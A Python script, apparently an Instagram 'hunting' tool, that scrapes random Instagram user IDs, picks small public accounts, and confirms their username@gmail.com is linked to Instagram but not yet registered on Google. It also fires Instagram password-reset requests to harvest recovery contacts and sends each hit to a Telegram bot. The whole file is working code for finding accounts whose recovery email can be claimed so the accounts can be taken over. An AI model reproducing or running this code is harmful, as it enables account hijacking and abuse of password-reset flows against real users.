import sys
import subprocess
import os
import time
import re
import random
import threading
from bs4 import BeautifulSoup
from hashlib import md5
from concurrent.futures import ThreadPoolExecutor
import requests
import httpx
from cfonts import render 


RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
RESET = '\033[0m'

def install_package(package):
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for package in ["h2", "requests", "beautifulsoup4", "httpx", "user_agent"]:
    install_package(package)

from user_agent import generate_user_agent
from random import choice, randrange


hits = 0
bads_instagram = 0
bads_email = 0
goodig = 0  

print('━' * 66)
logo = render('Levi Py', font='block', colors=['white', 'red'], align='center', background='black' , space=True)
print(logo)
credit = (f"{RED}Tool Credits : @RazaOg")
print(credit)
print('━' * 66)

year_prompt = """Choose year:
1 = 2012
2 = 2013  
3 = 2014
4 = 2015
5 = 2016
6 = 2017
7 = 2018
8 = 2019
9 = 2020
Enter choice (1-9): """

year = input(year_prompt)
while year not in ["1", "2", "3", "4", "5", "6", "7", "8", "9"]:
    year = input("Invalid choice. Please enter 1-9: ")

token = input("Enter token: ")
chat_id = input("Enter ID: ")

def show_stats():

    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    
    stats = f"{BOLD}{GREEN}Hits: {hits}{RESET} {RED}Bad IG: {bads_instagram}{RESET} {YELLOW}Bad Mail: {bads_email}{RESET} {CYAN}Good IG: {goodig}{RESET}"
    print('━' * 77)
    print(stats)
    print('━' * 77)

def tll():
    try:
        yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(yy) for i in range(randrange(6, 9)))
        n2 = ''.join(choice(yy) for i in range(randrange(3, 9)))
        host = ''.join(choice(yy) for i in range(randrange(15, 30)))
        
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-arch": "\"\"",
            "sec-ch-ua-bitness": "\"\"",
            "sec-ch-ua-full-version": "\"116.0.5845.72\"",
            "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-model": "\"ANY-LX2\"",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua-platform-version": "\"13.0.0\"",
            "sec-ch-ua-wow64": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
            "x-client-data": "CJjbygE=",
            "x-same-domain": "1",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            'user-agent': str(generate_user_agent()),
        }

        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
            'user-agent': generate_user_agent(),
        }
        
        data = {
            'f.req': '["' + tok + '","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        
        response = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=cookies, headers=headers, data=data)
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        
        try:
            os.remove('tl.txt')
        except:
            pass
            
        with open('tl.txt', 'a') as f:
            f.write(tl + '//' + host + '\n')
    except Exception:
        tll()

tll()

def check_gmail(email):
    if '@' in email:
        email = str(email).split('@')[0]
    try:
        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            tll()
            o = open('tl.txt', 'r').read().splitlines()[0]
            
        tl, host = o.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
            'user-agent': generate_user_agent(),
        }
        
        params = {'TL': tl}
        data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + email + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        
        response = requests.post('https://accounts.google.com/_/signup/usernameavailability', params=params, cookies=cookies, headers=headers, data=data)
        
        if '"gf.uar",1' in str(response.text):
            return 'good'
        elif '"er",null,null,null,null,400' in str(response.text):
            tll()
            check_gmail(email)
        else:
            return 'bad'
    except:
        check_gmail(email)

def rest(user):
    headers = {
        "user-agent": generate_user_agent(),
        "x-ig-app-id": "936619743392459",
        "x-requested-with": "XMLHttpRequest",
        "x-instagram-ajax": "1032099486",
        "x-csrftoken": "missing",
        "x-asbd-id": "359341",
        "origin": "https://www.instagram.com",
        "referer": "https://www.instagram.com/accounts/password/reset/",
        "accept-language": "en-US",
        "priority": "u=1, i",
    }
    
    r = httpx.Client(http2=True, headers=headers, timeout=20).post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data={"email_or_username": user}).json()
    
    try:
        body = r.get('body')
        rest = body.split("to ")[1].split(" with")[0]
        if rest:
            return rest
        else:
            return "No Rest"
    except:
        pass

def info(username, jj):
    global hits, year, goodig
    
    if year == "1":
        year_val = 2012
    elif year == "2":
        year_val = 2013
    elif year == "3":
        year_val = 2014
    elif year == "4":
        year_val = 2015
    elif year == "5":
        year_val = 2016
    elif year == "6":
        year_val = 2017
    elif year == "7":
        year_val = 2018
    elif year == "8":
        year_val = 2019
    elif year == "9":
        year_val = 2020
    
    hits += 1
    goodig += 1  
    
    
    if hits % 1 == 0:
        show_stats()
    
    if hits % 10 == 0 and os.path.exists("tl.txt"):
        os.remove("tl.txt")

    try:
        url = f'https://www.instagram.com/{username}/'
        username = url.strip('/').split('/')[-1]
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        meta_description = soup.find('meta', attrs={'name': 'description'})
        name_tag = soup.find('meta', property='og:title')
        
        if meta_description and name_tag:
            content = meta_description.get('content').replace(',', '')
            parts = content.split()
            
            posts = parts[4]
            followers = parts[0]
            following = parts[2]
            name = name_tag['content'].split('(@')[0].strip()
            
            msg = f'Name: {name}\nUsername: @{username}\nEmail: {username}@{jj}\nFollowers: {followers}\nFollowing: {following}\nPosts: {posts}\nDate: {year_val}\nURL: https://www.instagram.com/{username}/\nRest: {rest(username)}'
        else:
            msg = f'Username: @{username}\nEmail: {username}@{jj}\nURL: https://www.instagram.com/{username}/\nRest: {rest(username)}'
            
        with open('results.txt', 'a') as ff:
            ff.write(f'{msg}\n')
            
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}")
        except:
            pass
    except:
        msg = f'Username: @{username}\nEmail: {username}@{jj}\nURL: https://www.instagram.com/{username}/\nRest: {rest(username)}'
        
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}")
        except:
            pass
        
        with open('results.txt', 'a') as ff:
            ff.write(f'{msg}\n')

def Guts(email):
    global bads_email
    try:
        if 'good' == check_gmail(email):
            username, jj = email.split('@')
            info(username, jj)
        else:
            bads_email += 1
            show_stats()  
    except:
        pass

def check(email):
    global bads_instagram, hits, bads_email
    try:
        csrftoken = md5(str(time.time()).encode()).hexdigest()
        ua = generate_user_agent()
        pp = choice('00')
        
        
        show_stats()
        print(f"Current: {email}")
        
        if pp == '0':
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/signup/email/',
                'user-agent': ua,
                'x-csrftoken': csrftoken
            }
            data = {'email': email}
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
            
            if 'email_is_taken' in str(response.text):
                Guts(email)
            else:
                bads_instagram += 1
                show_stats()  
        elif pp == '1':
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                'user-agent': ua,
                'x-csrftoken': csrftoken,
            }
            data = {'username': email}
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data).text
            
            if '"user":true' in response:
                Guts(email)
            else:
                bads_instagram += 1
                show_stats()  
    except:
        show_stats()
        print(f"Current: {email}")

def rand_ids(existing_ids, uid1, uid2):
    while True:
        Id = str(random.randrange(uid1, uid2))
        if Id not in existing_ids:
            existing_ids.add(Id)
            return Id

def collect_users_1(uid1, uid2):
    ids_1 = set()
    found_usernames_1 = set()

    def worker():
        while True:
            try:
                rnd = str(random.randint(150, 999))
                user_agent_str = (
                    "Instagram 311.0.0.32.118 Android ("
                    + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
                    + "; "
                    + str(random.randint(100, 1300))
                    + "dpi; "
                    + str(random.randint(200, 2000))
                    + "x"
                    + str(random.randint(200, 2000))
                    + "; "
                    + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME", "INFINIX"])
                    + "; SM-T"
                    + rnd
                    + "; SM-T"
                    + rnd
                    + "; qcom; en_US; 545986"
                    + str(random.randint(111, 999))
                    + ")"
                )

                Id = rand_ids(ids_1, uid1, uid2)
                lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': user_agent_str,
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': lsd,
                }

                data = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': '{"userID":"' + str(Id) + '","username":"cristiano"}',
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001',
                }

                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                
                try:
                    resp_json = response.json()
                except:
                    resp_json = {}

                user_data = resp_json.get('data', {}).get('user', {})
                if not user_data:
                    continue

                username = user_data.get('username', '')
                follower_count = user_data.get('follower_count', 0)
                is_private = user_data.get('is_private', True)

                if not username or username in found_usernames_1:
                    continue

                if any(x in username for x in ["_"]) or len(username) < 8:
                    continue

                if is_private or follower_count > 60:
                    continue

                found_usernames_1.add(username)
                email = username + '@gmail.com'
                check(email)

            except:
                continue

    for _ in range(60):
        threading.Thread(target=worker).start()


show_stats()

if year == "1":
    collect_users_1(210468786, 269736186)
elif year == "2":
    collect_users_1(310438486, 495999999)
elif year == "3":
    collect_users_1(1219010000, 1429010000)
elif year == "4":
    collect_users_1(1700000000, 2400000000)
elif year == "5":
    collect_users_1(3313668786, 3713668786)
elif year == "6":
    collect_users_1(5398785217, 5999785217)
elif year == "7":
    collect_users_1(7497939245, 8597939245)
elif year == "8":
    collect_users_1(11254029834, 21254029834)
elif year == "9":
    collect_users_1(40064475395, 43464475395)

